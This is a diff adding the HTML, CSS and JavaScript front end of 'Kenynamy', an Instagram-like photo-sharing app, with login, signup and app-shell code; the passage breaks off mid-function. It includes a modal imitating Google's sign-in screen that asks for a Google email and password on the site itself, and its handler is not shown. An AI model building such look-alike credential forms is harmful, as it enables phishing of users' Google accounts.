@@ -1,0 +1,1732 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kenynamy - Share Your Moments</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: #fafafa;
+        }
+
+        .container {
+            display: flex;
+            height: 100vh;
+        }
+
+        .left-section {
+            flex: 1;
+            background: linear-gradient(135deg, #dc2743 0%, #cc1433 50%, #8b0a1a 100%);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            padding: 40px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .left-section::before {
+            content: '';
+            position: absolute;
+            width: 400px;
+            height: 400px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            top: -100px;
+            right: -100px;
+        }
+
+        .left-section::after {
+            content: '';
+            position: absolute;
+            width: 300px;
+            height: 300px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 50%;
+            bottom: -50px;
+            left: -100px;
+        }
+
+        .logo {
+            font-size: 64px;
+            font-weight: 900;
+            margin-bottom: 60px;
+            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.3);
+            position: relative;
+            z-index: 1;
+            letter-spacing: -2px;
+        }
+
+        .tagline {
+            font-size: 32px;
+            font-weight: 300;
+            text-align: center;
+            margin-bottom: 40px;
+            position: relative;
+            z-index: 1;
+            line-height: 1.4;
+        }
+
+        .tagline .highlight {
+            color: #ffeb3b;
+            font-weight: 600;
+        }
+
+        .phone-mockup {
+            width: 280px;
+            height: 560px;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 40px;
+            padding: 12px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            position: relative;
+            z-index: 1;
+        }
+
+        .phone-screen {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #f5f5f5, #e8e8e8);
+            border-radius: 36px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 12px;
+            color: #999;
+            overflow: hidden;
+            background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 512"><rect fill="%23dc2743" width="256" height="512"/><text x="128" y="256" text-anchor="middle" dominant-baseline="middle" fill="white" font-size="20" font-weight="bold">KENYNAMY</text></svg>');
+            background-size: cover;
+            background-position: center;
+        }
+
+        .right-section {
+            flex: 1;
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 40px;
+        }
+
+        .form-container {
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .login-form {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            border: 1px solid #dbdbdb;
+            margin-bottom: 20px;
+        }
+
+        .form-title {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 28px;
+            font-weight: 600;
+            color: #262626;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 13px;
+            color: #999;
+            font-weight: 500;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            font-size: 14px;
+            background-color: #fafafa;
+            transition: all 0.3s ease;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #dc2743;
+            background-color: white;
+            box-shadow: 0 0 0 3px rgba(220, 39, 67, 0.1);
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 8px 16px;
+            background: linear-gradient(135deg, #dc2743 0%, #cc1433 100%);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(220, 39, 67, 0.4);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .forgot-password {
+            text-align: right;
+            margin-top: 15px;
+        }
+
+        .forgot-password a {
+            color: #0095f6;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .forgot-password a:hover {
+            color: #0980d9;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+        }
+
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .divider-text {
+            padding: 0 15px;
+            color: #999;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .facebook-btn {
+            width: 100%;
+            padding: 8px 16px;
+            background-color: #0a5dc7;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .facebook-btn:hover {
+            background-color: #084ba1;
+        }
+
+        .google-btn {
+            width: 100%;
+            padding: 8px 16px;
+            background-color: white;
+            color: #262626;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 10px;
+        }
+
+        .google-btn:hover {
+            background-color: #f5f5f5;
+            border-color: #dc2743;
+        }
+
+        .signup-section {
+            background: white;
+            padding: 20px;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .signup-section p {
+            color: #262626;
+            font-size: 14px;
+        }
+
+        .signup-section a {
+            color: #dc2743;
+            text-decoration: none;
+            font-weight: 600;
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+
+        .signup-section a:hover {
+            color: #cc1433;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            animation: fadeIn 0.3s ease;
+        }
+
+        .modal-content {
+            background-color: #fafafa;
+            margin: 5% auto;
+            padding: 40px;
+            border-radius: 12px;
+            width: 100%;
+            max-width: 400px;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .close-btn {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+
+        .close-btn:hover {
+            color: #000;
+        }
+
+        .success-message {
+            display: none;
+            background-color: #4caf50;
+            color: white;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 6px;
+            text-align: center;
+        }
+
+        .error-message {
+            display: none;
+            background-color: #dc2743;
+            color: white;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 6px;
+            text-align: center;
+        }
+
+        /* Google Login Modal Styles */
+        .google-modal {
+            display: none;
+            position: fixed;
+            z-index: 2000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+
+        .google-modal-content {
+            background-color: white;
+            margin: 5% auto;
+            padding: 40px;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            animation: slideIn 0.3s ease;
+        }
+
+        .google-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .google-logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #3c4043;
+            margin-bottom: 10px;
+        }
+
+        .google-subtitle {
+            color: #5f6368;
+            font-size: 14px;
+        }
+
+        .google-form-group {
+            margin-bottom: 20px;
+        }
+
+        .google-form-group label {
+            display: block;
+            color: #3c4043;
+            font-size: 14px;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .google-form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            font-family: inherit;
+        }
+
+        .google-form-group input:focus {
+            outline: none;
+            border-color: #1f73db;
+            box-shadow: 0 0 0 3px rgba(31, 115, 219, 0.1);
+        }
+
+        .google-form-group input::placeholder {
+            color: #bdc1c6;
+        }
+
+        .google-buttons {
+            display: flex;
+            justify-content: space-between;
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        .google-btn-secondary {
+            flex: 1;
+            padding: 10px 20px;
+            border: 1px solid #dadce0;
+            background-color: #f8f9fa;
+            color: #3c4043;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .google-btn-secondary:hover {
+            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
+        }
+
+        .google-btn-primary {
+            flex: 1;
+            padding: 10px 20px;
+            background-color: #1f73db;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .google-btn-primary:hover {
+            background-color: #1765cc;
+            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
+        }
+
+        .google-error {
+            display: none;
+            background-color: #f8d7da;
+            color: #721c24;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            border: 1px solid #f5c6cb;
+        }
+
+        .google-loading {
+            display: none;
+            text-align: center;
+            color: #1f73db;
+            font-size: 14px;
+        }
+
+        .google-loading-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1f73db;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+
+        .app-shell {
+            display: none;
+            min-height: 100vh;
+            background-color: #fafafa;
+        }
+
+        .app-topbar {
+            width: 100%;
+            background: white;
+            border-bottom: 1px solid #dbdbdb;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 26px;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+
+        .app-topbar .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 20px;
+            font-weight: 700;
+            color: #262626;
+        }
+
+        .app-topbar .brand span {
+            font-size: 26px;
+        }
+
+        .app-topbar .top-actions {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            color: #262626;
+            font-size: 14px;
+        }
+
+        .app-layout {
+            display: flex;
+            min-height: calc(100vh - 54px);
+        }
+
+        .app-navigation {
+            width: 100px;
+            background-color: white;
+            border-right: 1px solid #dbdbdb;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 24px 10px;
+            gap: 22px;
+        }
+
+        .app-nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #262626;
+            font-size: 12px;
+            text-decoration: none;
+            cursor: pointer;
+            transition: color 0.2s ease;
+            width: 100%;
+        }
+
+        .app-nav-item span.icon {
+            font-size: 20px;
+        }
+
+        .app-nav-item:hover,
+        .app-nav-item.active {
+            color: #dc2743;
+        }
+
+        .app-main {
+            flex: 1;
+            padding: 32px 36px 48px;
+            max-width: 1180px;
+            margin: 0 auto;
+        }
+
+        .app-header {
+            padding-bottom: 26px;
+            border-bottom: 1px solid #dbdbdb;
+        }
+
+        .profile-photo {
+            width: 160px;
+            height: 160px;
+            border-radius: 50%;
+            border: 1px solid #dbdbdb;
+            background: linear-gradient(135deg, #dc2743 0%, #cc1433 100%);
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: rgba(255,255,255,0.95);
+            font-size: 14px;
+            text-transform: uppercase;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .profile-photo::after {
+            content: 'Add photo';
+            position: absolute;
+            bottom: 14px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 11px;
+            opacity: 0.9;
+        }
+
+        .profile-photo.has-image::after {
+            display: none;
+        }
+
+        .profile-photo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .profile-details {
+            flex: 1;
+            min-width: 300px;
+        }
+
+        .username-row {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .username-row h1 {
+            font-size: 28px;
+            font-weight: 600;
+            color: #262626;
+        }
+
+        .verified-badge {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            border: 1px solid #dbdbdb;
+            background-color: #fafafa;
+            color: #262626;
+            font-size: 14px;
+        }
+
+        .profile-actions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-top: 16px;
+        }
+
+        .profile-actions button {
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            color: #262626;
+            padding: 10px 18px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .profile-actions button:hover {
+            background: white;
+            border-color: #dc2743;
+            color: #dc2743;
+        }
+
+        .profile-bio {
+            margin-top: 18px;
+            line-height: 1.6;
+            color: #262626;
+            max-width: 760px;
+        }
+
+        .profile-bio .user-location {
+            color: #8e8e8e;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+
+        .profile-stats {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 28px;
+            margin-top: 22px;
+        }
+
+        .profile-stat {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .profile-stat strong {
+            font-size: 18px;
+            color: #262626;
+        }
+
+        .profile-stat span {
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+
+        .posts-grid {
+            display: grid;
+            grid-template-columns: repeat(3, minmax(0, 1fr));
+            gap: 18px;
+            margin-top: 38px;
+        }
+
+        .post-card {
+            position: relative;
+            aspect-ratio: 1 / 1;
+            border-radius: 12px;
+            overflow: hidden;
+            background-color: #f5f5f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #262626;
+            border: 1px solid #ebebeb;
+            font-weight: 700;
+            text-shadow: none;
+        }
+
+        .post-card.new {
+            border: 2px dashed #dbdbdb;
+            color: #8e8e8e;
+        }
+
+        .post-card.new::before {
+            content: '+';
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            font-size: 28px;
+            color: #262626;
+        }
+
+        .post-card span {
+            position: relative;
+            z-index: 1;
+        }
+
+        .nav-logout {
+            margin-top: auto;
+            color: #8e8e8e;
+            font-size: 12px;
+            cursor: pointer;
+            text-align: center;
+            width: 100%;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .app-header {
+            display: flex;
+            gap: 28px;
+            align-items: flex-start;
+            flex-wrap: wrap;
+            margin-bottom: 32px;
+        }
+
+        .profile-photo {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            border: 4px solid #fafafa;
+            background: linear-gradient(135deg, #dc2743 0%, #cc1433 100%);
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .profile-photo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .profile-details {
+            flex: 1;
+            min-width: 280px;
+        }
+
+        .profile-details .username-row {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 14px;
+        }
+
+        .profile-details .username-row h1 {
+            font-size: 32px;
+            font-weight: 600;
+            color: #262626;
+        }
+
+        .verified-badge {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            border: 1px solid #dbdbdb;
+            background-color: #fafafa;
+            color: #262626;
+            font-size: 14px;
+        }
+
+        .profile-actions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-top: 16px;
+        }
+
+        .profile-actions button {
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            color: #262626;
+            padding: 10px 18px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .profile-actions button:hover {
+            background: white;
+            border-color: #dc2743;
+            color: #dc2743;
+        }
+
+        .profile-bio {
+            margin-top: 20px;
+            line-height: 1.6;
+            color: #262626;
+            max-width: 750px;
+        }
+
+        .profile-stats {
+            display: flex;
+            gap: 42px;
+            margin-top: 20px;
+        }
+
+        .profile-stat {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .profile-stat strong {
+            font-size: 18px;
+            color: #262626;
+        }
+
+        .profile-stat span {
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+
+        .posts-grid {
+            display: grid;
+            grid-template-columns: repeat(3, minmax(0, 1fr));
+            gap: 18px;
+            margin-top: 34px;
+        }
+
+        .post-card {
+            position: relative;
+            aspect-ratio: 1 / 1;
+            border-radius: 18px;
+            overflow: hidden;
+            background: linear-gradient(180deg, rgba(220,39,67,0.18), rgba(220,39,67,0));
+            display: flex;
+            align-items: flex-end;
+            justify-content: flex-start;
+            padding: 14px;
+            color: white;
+            font-weight: 700;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
+            cursor: pointer;
+        }
+
+        .post-card::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.06);
+        }
+
+        .post-card span {
+            position: relative;
+            z-index: 1;
+        }
+
+        .post-card.new {
+            border: 2px dashed #dadce0;
+            color: #262626;
+            justify-content: center;
+            align-items: center;
+            text-shadow: none;
+            background: #fafafa;
+        }
+
+        .section-header {
+            margin-bottom: 26px;
+        }
+
+        .section-header h2 {
+            font-size: 28px;
+            margin-bottom: 8px;
+            color: #262626;
+        }
+
+        .section-header p {
+            color: #8e8e8e;
+            font-size: 15px;
+        }
+
+        .top-actions span {
+            cursor: pointer;
+            padding: 6px 10px;
+            border-radius: 8px;
+            transition: background-color 0.2s ease;
+        }
+
+        .top-actions span:hover {
+            background-color: rgba(220, 39, 67, 0.08);
+        }
+
+        .nav-logout {
+            margin-top: auto;
+            color: #8e8e8e;
+            font-size: 12px;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+            }
+
+            .left-section {
+                height: auto;
+                padding: 40px 20px;
+            }
+
+            .phone-mockup {
+                width: 100%;
+                max-width: 280px;
+                margin: 30px 0;
+            }
+
+            .tagline {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <div class="logo">Kenynamy</div>
+            <div class="tagline">Share everyday moments from your <span class="highlight">close friends</span></div>
+            <div class="phone-mockup">
+                <div class="phone-screen"></div>
+            </div>
+        </div>
+
+        <div class="right-section">
+            <div class="form-container">
+                <!-- Login Form -->
+                <div id="loginForm" class="login-form">
+                    <div class="form-title">Log in to Kenynamy</div>
+                    <div class="success-message" id="loginSuccess">Login successful! Redirecting...</div>
+                    <div class="error-message" id="loginError"></div>
+                    
+                    <form onsubmit="handleLogin(event)">
+                        <div class="form-group">
+                            <label for="loginEmail">Mobile number, username or email address</label>
+                            <input type="text" id="loginEmail" name="loginEmail" required placeholder="Enter your email or username">
+                        </div>
+                        <div class="form-group">
+                            <label for="loginPassword">Password</label>
+                            <input type="password" id="loginPassword" name="loginPassword" required placeholder="Enter your password">
+                        </div>
+                        <button type="submit" class="submit-btn">Log in</button>
+                    </form>
+
+                    <div class="forgot-password">
+                        <a href="#" onclick="alert('Password reset functionality coming soon!'); return false;">Forgotten password?</a>
+                    </div>
+
+                    <div class="divider">
+                        <div class="divider-line"></div>
+                        <div class="divider-text">OR</div>
+                        <div class="divider-line"></div>
+                    </div>
+
+                    <button class="facebook-btn" onclick="alert('Facebook login coming soon!')">
+                        <span>f</span> Log in with Facebook
+                    </button>
+
+                    <button class="google-btn" onclick="window.location.href='/api/auth/google'">
+                        <span style="color: #dc2743; font-weight: bold; font-size: 16px;">G</span> Continue with Google
+                    </button>
+                </div>
+
+                <!-- Sign Up Link -->
+                <div class="signup-section">
+                    <p>Don't have an account? <a onclick="switchToSignup()">Sign up</a></p>
+                </div>
+            </div>
+
+            <!-- Sign Up Modal -->
+            <div id="signupModal" class="modal">
+                <div class="modal-content">
+                    <span class="close-btn" onclick="switchToLogin()">&times;</span>
+                    <div class="form-title" style="margin-top: 0;">Sign up for Kenynamy</div>
+                    
+                    <div class="success-message" id="signupSuccess">Account created successfully! Please log in.</div>
+                    <div class="error-message" id="signupError"></div>
+
+                    <form onsubmit="handleSignup(event)">
+                        <div class="form-group">
+                            <label for="signupName">Full Name</label>
+                            <input type="text" id="signupName" name="signupName" required placeholder="Enter your full name">
+                        </div>
+                        <div class="form-group">
+                            <label for="signupEmail">Email Address</label>
+                            <input type="email" id="signupEmail" name="signupEmail" required placeholder="Enter your email">
+                        </div>
+                        <div class="form-group">
+                            <label for="signupUsername">Username</label>
+                            <input type="text" id="signupUsername" name="signupUsername" required placeholder="Choose a username">
+                        </div>
+                        <div class="form-group">
+                            <label for="signupPassword">Password</label>
+                            <input type="password" id="signupPassword" name="signupPassword" required placeholder="Create a password">
+                        </div>
+                        <div class="form-group">
+                            <label for="signupConfirmPassword">Confirm Password</label>
+                            <input type="password" id="signupConfirmPassword" name="signupConfirmPassword" required placeholder="Confirm your password">
+                        </div>
+                        <button type="submit" class="submit-btn">Sign up</button>
+                    </form>
+                </div>
+            </div>
+
+            <!-- Google Login Modal -->
+            <div id="googleModal" class="google-modal">
+                <div class="google-modal-content">
+                    <div class="google-header">
+                        <div class="google-logo">Google</div>
+                        <div class="google-subtitle">Sign in to your Google Account</div>
+                    </div>
+
+                    <div class="google-error" id="googleError"></div>
+                    <div class="google-loading" id="googleLoading">
+                        <div class="google-loading-spinner"></div>
+                        <div>Signing you in...</div>
+                    </div>
+
+                    <form id="googleForm" onsubmit="handleGoogleLogin(event)">
+                        <div class="google-form-group">
+                            <label for="googleEmail">Email or phone</label>
+                            <input type="text" id="googleEmail" required placeholder="Enter your email">
+                        </div>
+
+                        <div class="google-form-group" id="passwordGroup" style="display: none;">
+                            <label for="googlePassword">Password</label>
+                            <input type="password" id="googlePassword" placeholder="Enter your password">
+                        </div>
+
+                        <div class="google-buttons">
+                            <button type="button" class="google-btn-secondary" onclick="closeGoogleModal()">Cancel</button>
+                            <button type="submit" class="google-btn-primary" id="googleSubmitBtn">Next</button>
+                        </div>
+                    </form>
+
+                    <div style="margin-top: 20px; text-align: center;">
+                        <p style="color: #5f6368; font-size: 12px; margin-bottom: 10px;">
+                            <a href="#" style="color: #1f73db; text-decoration: none;">Create account</a> · 
+                            <a href="#" style="color: #1f73db; text-decoration: none;">Forgot password?</a>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="appShell" class="app-shell">
+        <div class="app-topbar">
+            <div class="brand"><span>📷</span>Kenynamy</div>
+            <div class="top-actions">
+                <span onclick="switchSection('messages')">Messages</span>
+                <span onclick="switchSection('create')">Create</span>
+                <span onclick="switchSection('profile')">Profile</span>
+                <span onclick="logout()" style="cursor:pointer;color:#dc2743;">Logout</span>
+            </div>
+        </div>
+        <div class="app-layout">
+            <aside class="app-navigation">
+                <div class="app-nav-item active" data-section="home" onclick="switchSection('home')"><span class="icon">🏠</span><span>Home</span></div>
+                <div class="app-nav-item" data-section="search" onclick="switchSection('search')"><span class="icon">🔍</span><span>Search</span></div>
+                <div class="app-nav-item" data-section="reels" onclick="switchSection('reels')"><span class="icon">🎬</span><span>Reels</span></div>
+                <div class="app-nav-item" data-section="messages" onclick="switchSection('messages')"><span class="icon">✉️</span><span>Messages</span></div>
+                <div class="app-nav-item" data-section="notifications" onclick="switchSection('notifications')"><span class="icon">❤️</span><span>Notifications</span></div>
+                <div class="app-nav-item" data-section="create" onclick="switchSection('create')"><span class="icon">➕</span><span>Create</span></div>
+                <div class="app-nav-item" data-section="profile" onclick="switchSection('profile')"><span class="icon">👤</span><span>Profile</span></div>
+                <div class="nav-logout" onclick="logout()">Log out</div>
+            </aside>
+            <main class="app-main" id="appMain"></main>
+            <input type="file" id="profilePicInput" accept="image/*" class="hidden" onchange="updateProfilePicture(event)">
+        </div>
+    </div>
+
+    <script>
+        const authTokenKey = 'kenynamy_token';
+
+        window.onload = async function () {
+            await initializeApp();
+        };
+
+        async function apiFetch(path, options = {}) {
+            const headers = options.headers ? { ...options.headers } : {};
+            if (options.body && !(options.body instanceof FormData)) {
+                headers['Content-Type'] = 'application/json';
+            }
+
+            const token = localStorage.getItem(authTokenKey);
+            if (token) {
+                headers.Authorization = `Bearer ${token}`;
+            }
+
+            const response = await fetch(`/api${path}`, {
+                ...options,
+                headers,
+            });
+
+            const text = await response.text();
+            let data = {};
+            try {
+                data = text ? JSON.parse(text) : {};
+            } catch (error) {
+                data = { message: text };
+            }
+
+            if (!response.ok) {
+                throw new Error(data.message || response.statusText || 'Request failed');
+            }
+
+            return data;
+        }
+
+        async function initializeApp() {
+            const token = localStorage.getItem(authTokenKey);
+            if (!token) {
+                document.getElementById('appShell').style.display = 'none';
+                document.querySelector('.container').classList.remove('hidden');
+                return;
+            }
+
+            try {
+                const user = await apiFetch('/users/me');
+                await showAppShell(user, 'home');
+            } catch (error) {
+                console.warn('Session restore failed', error);
+                clearToken();
+                document.getElementById('appShell').style.display = 'none';
+                document.querySelector('.container').classList.remove('hidden');
+            }
+        }
+
+        function saveToken(token) {
+            localStorage.setItem(authTokenKey, token);
+        }
+
+        function clearToken() {
+            localStorage.removeItem(authTokenKey);
+        }
+
+        async function handleLogin(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('loginEmail').value.trim();
+            const password = document.getElementById('loginPassword').value;
+            const errorDiv = document.getElementById('loginError');
+            const successDiv = document.getElementById('loginSuccess');
+
+            errorDiv.style.display = 'none';
+            successDiv.style.display = 'none';
+
+            if (!email || !password) {
+                errorDiv.textContent = 'Please fill in all fields';
+                errorDiv.style.display = 'block';
+                return;
+            }
+
+            try {
+                const response = await apiFetch('/auth/login', {
+                    method: 'POST',
+                    body: JSON.stringify({ emailOrUsername: email, password }),
+                });
+
+                saveToken(response.token);
+                successDiv.style.display = 'block';
+                setTimeout(async () => {
+                    await showAppShell(response.user, 'home');
+                }, 600);
+            } catch (error) {
+                errorDiv.textContent = error.message;
+                errorDiv.style.display = 'block';
+            }
+        }
+
+        async function handleSignup(event) {
+            event.preventDefault();
+
+            const name = document.getElementById('signupName').value.trim();
+            const email = document.getElementById('signupEmail').value.trim();
+            const username = document.getElementById('signupUsername').value.trim();
+            const password = document.getElementById('signupPassword').value;
+            const confirmPassword = document.getElementById('signupConfirmPassword').value;
+            const errorDiv = document.getElementById('signupError');
+            const successDiv = document.getElementById('signupSuccess');
+
+            errorDiv.style.display = 'none';
+            successDiv.style.display = 'none';
+
+            if (!name || !email || !username || !password || !confirmPassword) {
+                errorDiv.textContent = 'Please fill in all fields';
+                errorDiv.style.display = 'block';
+                return;
+            }
+
+            if (password !== confirmPassword) {
+                errorDiv.textContent = 'Passwords do not match';
+                errorDiv.style.display = 'block';
+                return;
+            }
+
+            if (password.length < 6) {
+                errorDiv.textContent = 'Password must be at least 6 characters';
+                errorDiv.style.display = 'block';
+                return;
+            }
+
+            try {
+                const response = await apiFetch('/auth/signup', {
+                    method: 'POST',
+                    body: JSON.stringify({ name, email, username, password }),
+                });
+
+                saveToken(response.token);
+                successDiv.style.display = 'block';
+                setTimeout(async () => {
+                    document.getElementById('signupModal').style.display = 'none';
+                    await showAppShell(response.user, 'profile');
+                }, 700);
+            } catch (error) {
+                errorDiv.textContent = error.message;
+                errorDiv.style.display = 'block';
+            }
+        }
+
+        function switchToSignup() {
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('signupModal').style.display = 'block';
+        }
+
+        function switchToLogin() {
+            document.getElementById('signupModal').style.display = 'none';
+            document.getElementById('loginForm').style.display = 'block';
+            document.querySelector('#loginForm form').reset();
+            document.querySelector('#signupModal form').reset();
+        }
+
+        // Close signup modal when clicking outside it
+        window.onclick = function (event) {
+            const modal = document.getElementById('signupModal');
+            if (event.target === modal) {
+                switchToLogin();
+            }
+        };
+
+        let currentSection = 'home';
+
+        async function showAppShell(user, section = 'home') {
+            document.querySelector('.container').classList.add('hidden');
+            document.getElementById('appShell').style.display = 'block';
+            await switchSection(section, user);
+        }
+
+        function setActiveNav(section) {
+            document.querySelectorAll('.app-nav-item').forEach((item) => {
+                item.classList.toggle('active', item.dataset.section === section);
+            });
+        }
+
+        async function switchSection(section, user) {
+            const currentUser = user || (await apiFetch('/users/me'));
+            if (!currentUser || !currentUser.email) {
+                return;
+            }
+
+            currentSection = section;
+            setActiveNav(section);
+            await renderSection(currentUser, section);
+        }
+
+        async function renderSection(user, section) {
+            const appMain = document.getElementById('appMain');
+            if (section === 'profile') {
+                appMain.innerHTML = renderProfileSection(user);
+                renderProfile(user);
+            } else if (section === 'home') {
+                appMain.innerHTML = await renderHomeSection(user);
+            } else if (section === 'search') {
+                appMain.innerHTML = renderSearchSection();
+            } else if (section === 'reels') {
+                appMain.innerHTML = await renderReelsSection();
+            } else if (section === 'messages') {
